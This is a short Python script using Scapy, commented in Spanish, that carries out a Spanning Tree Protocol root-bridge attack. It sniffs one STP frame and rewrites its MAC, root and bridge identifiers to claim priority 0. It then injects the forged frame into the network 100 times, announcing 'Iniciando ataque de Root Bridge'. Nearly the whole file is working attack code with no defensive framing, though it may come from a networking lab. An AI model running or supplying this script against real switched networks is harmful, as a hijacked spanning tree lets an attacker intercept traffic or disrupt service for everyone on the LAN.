#!/usr/bin/env python3
from scapy.all import *
import time

# Captura tramas STP (usando el filtro de la dirección multicast de STP)
print("Capturando tramas STP...")
pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1)

if pkt:
    # Cambiar la dirección MAC de origen
    pkt[0].src = "00:00:00:00:00:01"

    # Configurar Root ID y Root MAC para tener la prioridad más alta (0)
    pkt[0].rootid = 0
    pkt[0].rootmac = "00:00:00:00:00:01"

    # Configurar Bridge ID y Bridge MAC
    pkt[0].bridgeid = 0
    pkt[0].bridgemac = "00:00:00:00:00:01"

    # Mostrar la trama modificada
    pkt[0].show()

    # Bucle para enviar las tramas modificadas a la red
    print("Iniciando ataque de Root Bridge...")
    for i in range(0, 100):
        sendp(pkt[0], loop=0, verbose=1)
        time.sleep(1)
else:
    print("No se detectaron tramas STP. Asegúrate de estar en una red con switches.")
